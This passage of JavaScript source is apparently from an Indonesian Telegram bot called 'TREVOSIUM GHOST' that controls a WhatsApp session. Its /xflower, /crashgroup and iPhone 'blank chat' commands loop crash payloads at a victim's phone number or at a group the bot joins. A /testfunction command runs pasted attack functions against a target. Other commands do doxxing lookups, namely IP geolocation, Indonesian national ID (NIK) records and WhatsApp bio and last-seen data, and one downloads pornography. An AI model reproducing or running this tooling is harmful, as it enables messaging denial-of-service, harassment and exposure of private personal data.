      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 25; i++) {
    await iosProduct2(target);
    await sleep(7500);
    await IosCtt(target);
    await sleep(15000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat iPhone
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command(
  "xflower",
  checkWhatsAppConnection,
  checkPremium, checkCooldown,
  async (ctx) => {
  
  if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 ☇ Format: /xflower 62×××`);

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";


    // ==========================

    const processMessage = await ctx.reply(`\`\`\`javascript
⬡═―⊱ 〣 TREVOSIUM GHOST 〣 ⊰—═⬡
∙▹ Target: ${q}
∙▹ Type: Forclose Android
∙▹ Status: Process
∙▹ Note: Spam Free At Will
╘═————————————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 20; i++) {
      await croserds(sock, target);
      await sleep(1550);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processMessageId,
      undefined, `\`\`\`javascript
⬡═―⊱ 〣 TREVOSIUM GHOST 〣 ⊰—═⬡
∙▹ Target: ${q}
∙▹ Type: Forclose Android
∙▹ Status: Success
∙▹ Note: Spam Free At Will
╘═————————————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
   });
  });
  
bot.command(
  "crashgroup",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;

    const allowed = loadAllowedGroups();
    if (!allowed.includes(chatId)) {
      return ctx.reply("🔒 Grup ini tidak memiliki izin akses.");
    }

    const q = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!q) {
      return ctx.reply(
        "🚫 Masukin link grup yang bener!\nContoh:\n/crashgroup https://chat.whatsapp.com/XXXX"
      );
    }

    const codeMatch = q.match(/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (!codeMatch) {
      return ctx.reply(
        "🚫 Link grup salah!\nContoh:\n/crashgroup https://chat.whatsapp.com/XXXX"
      );
    }
    
    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const groupLink = q;
    const groupCode = codeMatch[1];

    try {
      await ctx.reply("⏳ Sedang join grup, tunggu bentar...");

      let groupJid;
      try {
        groupJid = await sock.groupAcceptInvite(groupCode);
      } catch (err) {
        return ctx.reply("❌ Gagal join grup:\n" + (err?.message || err));
      }

      if (!groupJid) {
        return ctx.reply("❌ Gagal mendapatkan JID grup.");
      }

      const sent = await ctx.telegram.sendPhoto(
        chatId,
        "https://files.catbox.moe/65ghnl.jpg",
        {
          caption: `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Target : ${groupLink}
⌑ Type   : Crash Group
⌑ Status : Processing
╘═—————————————————═⬡</pre></blockquote>
          `,
          parse_mode: "HTML"
        }
      );

      const messageId = sent.message_id;

      for (let i = 0; i < 15; i++) {
        try {
          await crashGP(sock, target);
        } catch (e) {
          console.log("error:", e?.message || e);
        }
        await sleep(15000);
      }

      await ctx.telegram.editMessageCaption(
        chatId,
        messageId,
        undefined,
        `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Target : ${groupLink}
⌑ Type   : Crash Group
⌑ Status : Success
╘═—————————————————═⬡</pre></blockquote>
        `,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: groupLink }
            ]]
          }
        }
      );

    } catch (err) {
      console.error(err);
      ctx.reply("❌ Terjadi kesalahan sistem.");
    }
  }
);

bot.command(
  'testfunction',
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const args = ctx.message.text.trim().split(" ");

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testfunction 62××× 10 (reply function)"
      );

    const q = args[1];
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply("❌ ☇ Jumlah harus angka");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
      return ctx.reply("❌ ☇ Reply dengan function JavaScript");

    const thumbnailUrl = "https://files.catbox.moe/cu91z7.jpg";

    const captionStart = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡</pre></blockquote>
⌑ Target
╰❁ ${q}

⌑ Type
╰❁ Unknown Function

⌑ Status
╰❁ Process...
`;

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: captionStart,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
        ],
      },
    });

    const safeSock = createSafeSock(sock);
    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) return ctx.reply("❌ ☇ Function tidak valid");

    const funcName = matchFunc[1];
    const wrapper = `${funcCode}\n${funcName}`;

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) await fn(target);
        else if (arity === 2) await fn(safeSock, target);
        else await fn(safeSock, target, true);
      } catch (err) {}
      await sleep(200);
    }

    const captionFinal = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡</pre></blockquote>
⌑ Target
╰❁ ${q}

⌑ Type
╰❁ Unknown Function

⌑ Status
╰❁ ✅ Success
`;

    try {
      await ctx.editMessageCaption(captionFinal, {
        chat_id: chatId,
        message_id: processMsg.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ],
        },
      });
    } catch (e) {
      await ctx.replyWithPhoto(thumbnailUrl, {
        caption: captionFinal,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ],
        },
      });
    }
  }
);

///=======( TOOLS AREA )=======\\\

bot.command("tiktokdl", async (ctx) => { 
const args = ctx.message.text.split(/\s+/).slice(1).join(' '); if (!args) return ctx.reply('🪧 ☇ Format: /tiktokdl https://example.com/');

let url = args; if (ctx.message.entities) { for (const e of ctx.message.entities) { if (e.type === 'url') { url = ctx.message.text.substring(e.offset, e.offset + e.length); break; } } }

const wait = await ctx.reply('⌛ ☇ Tunggu sebentar...');

try { const { data } = await axios.get('https://tikwm.com/api/', { params: { url }, headers: { 'user-agent': 'Mozilla/5.0', accept: 'application/json' }, timeout: 20000 });

if (!data || data.code !== 0 || !data.data) return ctx.reply('❌ ☇ Gagal ambil data video');

const d = data.data;

if (Array.isArray(d.images) && d.images.length) {
  const imgs = d.images.slice(0, 10);
  for (const img of imgs) {
    const res = await axios.get(img, { responseType: 'arraybuffer' });
    await ctx.replyWithPhoto({ source: Buffer.from(res.data) });
  }
  return;
}

const videoUrl = d.play || d.hdplay || d.wmplay;
if (!videoUrl) return ctx.reply('❌ ☇ Tidak ada link video');

const video = await axios.get(videoUrl, { responseType: 'arraybuffer' });
await ctx.replyWithVideo({ source: Buffer.from(video.data) });

} catch { await ctx.reply('❌ ☇ Error mengunduh video'); }

try { await ctx.deleteMessage(wait.message_id); } catch {} });

bot.command('doxxingip', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const ip = ctx.message.text.split(' ')[1]?.trim();

  if (!ip) {
    return ctx.reply("❌ ☇ Format: /doxxingip <IP>");
  }

  const userPremium = premiumUsers.find(u => u.id === userId);
  if (!userPremium || new Date(userPremium.expiresAt) < new Date()) {
    return ctx.reply("❌ ☇ Kamu bukan user Premium!");
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(
      p => /^\d{1,3}$/.test(p) && !(p.length > 1 && p.startsWith("0")) && +p >= 0 && +p <= 255
    );
  }

  function isValidIPv6(ip) {
    const r = /^(([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(([0-9A-Fa-f]{1,4}:){1,7}:)|(::([0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4}))$/;
    return r.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply(
      "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar."
    );
  }

  const processingMsg = await ctx.reply(
    `🔎 ☇ Tracking IP ${ip} sedang diproses...`
  );

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, {
      timeout: 10000
    });
    const data = res.data;

    if (!data || data.success === false) {
      return ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "-";
    const lon = data.longitude || "-";
    const mapsUrl =
      lat !== "-" && lon !== "-"
        ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}`
        : null;

    const caption = `
<blockquote><pre>⬡⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰⬡</pre></blockquote>
⌑ IP
╰❁ ${data.ip || "-"}

⌑ Country
╰❁ ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}

⌑ Region
╰❁ ${data.region || "-"}

⌑ City
╰❁ ${data.city || "-"}

⌑ ZIP
╰❁ ${data.postal || "-"}

⌑ Timezone
╰❁ ${data.timezone_gmt || "-"}

⌑ ISP
╰❁ ${data.isp || "-"}

⌑ Org
╰❁ ${data.org || "-"}

⌑ ASN
╰❁ ${data.asn || "-"}

⌑ Lat/Lon
╰❁ ${lat}, ${lon}
${mapsUrl ? `📍 ☇ <a href="${mapsUrl}">Buka di Maps</a>` : ""}
`;

    await ctx.reply(caption, {
      parse_mode: "HTML",
      disable_web_page_preview: false
    });
  } catch (err) {
    await ctx.reply(
      "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti."
    );
  } finally {
    try {
      await ctx.deleteMessage(processingMsg.message_id);
    } catch {}
  }
});

bot.command("anime", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text || "";
  const query = text.replace(/^\/anime\s*/i, "").trim();

  if (!query) {
    return ctx.reply(
      "☇ Gunakan perintah : `/anime <judul anime>`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const apiUrl =
      `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=1`;

    const res = await fetch(apiUrl);
    const json = await res.json();

    if (!json || !Array.isArray(json.data) || json.data.length === 0) {
      return ctx.reply("❌ Tidak Menemukan Daftar Anime dengan judul tersebut.");
    }

    const anime = json.data[0];

    const title = anime.title || "-";
    const type = anime.type || "-";
    const episodes = anime.episodes ?? "?";
    const status = anime.status || "-";
    const score = anime.score ?? "N/A";
    const malUrl = anime.url || "-";
    const imageUrl = anime.images?.jpg?.image_url;
    const synopsis = anime.synopsis
      ? anime.synopsis.slice(0, 400) + (anime.synopsis.length > 400 ? "..." : "")
      : "Tidak ada sinopsis.";

    const caption = `\`\`\`
⧂ BERIKUT DATA ANIME
\`\`\`
☇ Title : ${title}
☇ Type : ${type}
☇ Episode : ${episodes}
☇ Skor : ${score}
☇ Status : ${status}
☇ Sinopsis : ${synopsis}
☇ Link : [MyAnimeList](${malUrl})
`;

    if (imageUrl) {
      await ctx.replyWithPhoto(imageUrl, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☇ Cari Lagi", switch_inline_query_current_chat: "/anime " }]
          ]
        }
      });
    } else {
      await ctx.reply(caption, { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error("Anime Error:", err);
    ctx.reply("⚠️ Yah Tidak Ada Data, Dengan Anime Yang Kamu Cari");
  }
});

bot.command('nikparse', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(' ').slice(1);
  const nik = args[0]?.trim();

  if (!nik) return ctx.reply("🪧 ☇ Format: /nikparse 1234567890123456");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const waitMsg = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK...");

  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote><pre>⬡⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰⬡</pre></blockquote>

⌑ NIK
╰❁ ${get(d.nik) || nik}

⌑ Nama
╰❁ ${get(d.nama)}

⌑ Jenis Kelamin
╰❁ ${get(d.jenis_kelamin || d.gender)}

⌑ Tempat Lahir
╰❁ ${get(d.tempat_lahir || d.tempat)}

⌑ Tanggal Lahir
╰❁ ${get(d.tanggal_lahir || d.tgl_lahir)}

⌑ Umur
╰❁ ${get(d.umur)}

⌑ Provinsi
╰❁ ${get(d.provinsi || d.province)}

⌑ Kabupaten/Kota
╰❁ ${get(d.kabupaten || d.kota || d.regency)}

⌑ Kecamatan
╰❁ ${get(d.kecamatan || d.district)}

⌑ Kelurahan/Desa
╰❁ ${get(d.kelurahan || d.village)}
`;

    return ctx.reply(caption, {
      parse_mode: "HTML",
      disable_web_page_preview: true
    });
  };

  try {
    const res = await axios.get(`https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000
    });

    const data =
      res.data?.data ||
      res.data?.result ||
      res.data ||
      null;

    if (data && typeof data === "object" && Object.keys(data).length > 0) {
      await replyHTML(data);
    } else {
      await ctx.reply("❌ ☇ NIK tidak ditemukan di database");
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Gagal menghubungi API, coba lagi nanti");
  } finally {
    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}
  }
});

bot.command('tourl', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const replyMsg = ctx.message.reply_to_message;

  if (!replyMsg) {
    return ctx.reply("🪧 ☇ Format: /tourl (reply dengan foto atau video)");
  }

  let fileId = null;
  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const waitMsg = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke Catbox...");

  try {
    const file = await ctx.telegram.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${ctx.telegram.token}/${file.file_path}`;

    const uploadedUrl = await uploadToCatbox(fileLink);

    if (typeof uploadedUrl === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadedUrl.trim())) {
      await ctx.reply(uploadedUrl.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke Catbox.\n" + String(uploadedUrl).slice(0, 200));
    }
  } catch (e) {
    const msgError = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke Catbox`
      : "❌ ☇ Gagal unggah, coba lagi.";
    await ctx.reply(msgError);
  } finally {
    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}
  }
});

bot.command("bokep", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from.id;
  const msgId = ctx.message?.message_id;
  const text = ctx.message?.text;

  // validasi dasar
  if (!chatId || !text) return;

  const args = text.split(" ").slice(1).join(" ").trim();
  if (!args) {
    return ctx.reply("🪧 Gunakan: /bokep <kata kunci>", {
      reply_to_message_id: msgId,
    }).catch(() => {});
  }

  let loadingMsg;

  try {
    // ===== kirim pesan loading =====
    loadingMsg = await ctx.reply(
      `⏳ Mencari video...\n🔍 Kata kunci: ${args}`,
      { reply_to_message_id: msgId, parse_mode: "Markdown" }
    );

    const editMessage = async (newText) => {
      try {
        await ctx.telegram.editMessageText(
          chatId,
          loadingMsg.message_id,
          undefined,
          newText,
          { parse_mode: "Markdown" }
        );
      } catch (e) {
        console.log("⚠️ Gagal edit pesan:", e.message);
      }
    };

    // ===== cari video =====
    await editMessage(`🔍 *Mencari video...*\nKata kunci : ${args}`);

    const res = await fetch(
      `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(args)}`
    );
    if (!res.ok) throw new Error(`Gagal ambil data pencarian (${res.status})`);

    const data = await res.json().catch(() => ({}));
    if (!data.status || !Array.isArray(data.result) || !data.result.length) {
      return editMessage(`⚠️ Tidak ada hasil ditemukan untuk: ${args}`);
    }

    const top = data.result[0];
    const title = top.title || args;
    const link = top.link;

    // ===== ambil detail =====
    await editMessage(`⌛ Mengambil detail video...\n⎙ Judul : ${title}`);

    const dlRes = await fetch(
      `https://restapi-v2.simplebot.my.id/download/xnxx?url=${encodeURIComponent(link)}`
    );
    if (!dlRes.ok) throw new Error(`Gagal ambil detail (${dlRes.status})`);

    const dlData = await dlRes.json().catch(() => ({}));
    const high = dlData?.result?.files?.high;

    if (!high) {
      return editMessage(`⚠️ Video tidak memiliki kualitas High (HD)\n⎙ Judul : ${title}`);
    }

    // ===== download video =====
    await editMessage(`⌭ Mengunduh video...\n⎋ Resolusi : High`);

    const videoRes = await fetch(high);
    if (!videoRes.ok) throw new Error(`Gagal unduh file video (${videoRes.status})`);

    const buffer = Buffer.from(await videoRes.arrayBuffer());
    const filePath = path.join(process.cwd(), `temp_${Date.now()}.mp4`);
    fs.writeFileSync(filePath, buffer);

    // ===== kirim video =====
    await editMessage(`✅ Video ditemukan!\n⸙ Mengirim ke chat...`);
    await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    await ctx.replyWithVideo(
      { source: filePath },
      {
        caption:
`🎬 HASIL VIDEO BOKEP
⎙ Judul : ${title}
⎋ Resolusi : High`,
        reply_to_message_id: msgId,
        supports_streaming: true,
      }
    );

    fs.unlinkSync(filePath);
  } catch (e) {
    console.error("❌ Error /bokep:", e);
    if (loadingMsg) {
      await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    }
    await ctx.reply(
      `❌ Terjadi kesalahan saat mengambil data\n\n\`\`\`${e.message}\`\`\``,
      { reply_to_message_id: msgId, parse_mode: "Markdown" }
    ).catch(() => {});
  }
});

bot.command("ssip", async (ctx) => {
  const chatId = ctx.chat?.id;
  const msgId = ctx.message?.message_id;
  const textMsg = ctx.message?.text;

  if (!chatId || !textMsg) return;

  const input = textMsg.split(" ").slice(1).join(" ").trim();

  // ===== validasi input =====
  if (!input) {
    return ctx.reply(
      "🪧 Format salah.\n\nContoh:\n`/ssip Name | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown", reply_to_message_id: msgId }
    ).catch(() => {});
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "TELKOMSEL";

  const apiUrl =
    `https://brat.siputzx.my.id/iphone-quoted?` +
    `time=${encodeURIComponent(time)}` +
    `&messageText=${encodeURIComponent(text)}` +
    `&carrierName=${encodeURIComponent(carrier)}` +
    `&batteryPercentage=${encodeURIComponent(battery)}` +
    `&signalStrength=4&emojiStyle=apple`;

  try {
    // ===== chat action =====
    await ctx.telegram.sendChatAction(chatId, "upload_photo").catch(() => {});

    // ===== ambil gambar =====
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    // ===== kirim foto =====
    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption:
`「 ⚆ 」IPhone Generate
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 αµƭɦσɾ 」", url: "https://t.me/XavienZzTamvan" }]
          ]
        },
        reply_to_message_id: msgId
      }
    );
  } catch (e) {
    console.error("❌ Error /ssip:", e.message);
    await ctx.reply(
      "❌ Terjadi kesalahan saat memproses gambar.",
      { reply_to_message_id: msgId }
    ).catch(() => {});
  }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
  const chatId = ctx.chat?.id;
  const msgId = ctx.message?.message_id;
  const text = ctx.message?.text;

  if (!chatId || !text) return;

  const keyword = text.split(" ").slice(1).join(" ").trim();

  if (!keyword) {
    return ctx.reply(
      "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
      { parse_mode: "Markdown", reply_to_message_id: msgId }
    ).catch(() => {});
  }

  let loading;
  try {
    loading = await ctx.reply("⸙ SEARCHING VIDEO TIKTOK......");

    const searchUrl =
      `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(keyword)}&count=5`;

    const res = await axios.get(searchUrl, { timeout: 20000 });
    const data = res.data;

    const videos =
      data?.data?.videos ||
      data?.data?.list ||
      data?.data?.aweme_list ||
      data?.data ||
      [];

    if (!Array.isArray(videos) || videos.length === 0) {
      await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
      return ctx.reply("⚠️ Tidak ada hasil ditemukan untuk kata kunci tersebut.");
    }

    const topVideos = videos.slice(0, 5);
    const uniqueKey = Math.random().toString(36).slice(2, 10);
    tiktokCache.set(uniqueKey, topVideos);

    const keyboard = topVideos.map((v, i) => {
      const title = (v.title || "Tanpa Judul").slice(0, 35);
      return [
        {
          text: `${i + 1}. ${title}`,
          callback_data: `tiktok|${uniqueKey}|${i}`,
        },
      ];
    });

    await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
    await ctx.reply(
      `⸙ Ditemukan *${topVideos.length}* hasil untuk:\n\`${keyword}\`\nPilih salah satu video di bawah ini:`,
      {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      }
    );
  } catch (e) {
    console.error("❌ TikTok Search Error:", e.message);
    if (loading) {
      await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
    }
    await ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.").catch(() => {});
  }
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery?.data;
  const chatId = ctx.chat?.id;

  if (!data || !data.startsWith("tiktok|")) return;

  await ctx.answerCbQuery("⏳ MENGUNDUH VIDEO SABAR LOADING.....").catch(() => {});

  const [, cacheKey, indexStr] = data.split("|");
  const index = parseInt(indexStr, 10);

  const cached = tiktokCache.get(cacheKey);
  if (!cached || !cached[index]) {
    return ctx.reply("⚠️ Data video tidak ditemukan (cache kedaluwarsa).").catch(() => {});
  }

  const v = cached[index];
  const author =
    v.author?.unique_id ||
    v.author?.nickname ||
    v.user?.unique_id ||
    "unknown";

  const videoId =
    v.video_id ||
    v.id ||
    v.aweme_id ||
    v.short_id ||
    v.video?.id;

  const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

  try {
    const res = await axios.post(
      "https://www.tikwm.com/api/",
      `url=${encodeURIComponent(tiktokUrl)}`,
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        },
        timeout: 30000,
      }
    );

    const result = res.data;
    if (!result || result.code !== 0 || !result.data) {
      throw new Error("Video tidak valid");
    }

    const vid = result.data;
    const videoUrl =
      vid.play || vid.hdplay || vid.wmplay || vid.play_addr;

    const caption =
`☀ Trevosium Searching
Video : *${vid.title || "Video TikTok"}*
Author : @${vid.author?.unique_id || "unknown"}
Likes : ${vid.digg_count || 0}
Comment : ${vid.comment_count || 0}
[🌐 Lihat di TikTok](${tiktokUrl})`;

    await ctx.replyWithVideo(videoUrl, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error("❌ Gagal download:", e.message);
    await ctx.reply("⚠️ Gagal mengunduh video TikTok.").catch(() => {});
  }
});

bot.command("toanime", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from?.id;
  const pengirim = ctx.from;

  if (!chatId || !userId) return;

  const text = ctx.message?.text || "";
  const urlArg = text.split(" ").slice(1).join(" ").trim();

  let imageUrl = urlArg || null;

  // ===== ambil foto dari reply =====
  if (!imageUrl && ctx.message?.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];
    try {
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      imageUrl = fileLink.href;
    } catch {
      imageUrl = null;
    }
  }

  if (!imageUrl) {
    return ctx.reply(
      "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /toanime"
    ).catch(() => {});
  }

  const status = await ctx.reply("⌭ Memproses gambar ke mode Anime...")
    .catch(() => null);
    
   try {
    // ===== API anime =====
    const res = await fetch(
      `https://api.nekolabs.web.id/style-changer/anime?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json().catch(() => ({}));
    const hasil = data?.result || null;

    if (!hasil) {
      if (status) {
        await ctx.telegram.editMessageText(
          chatId,
          status.message_id,
          undefined,
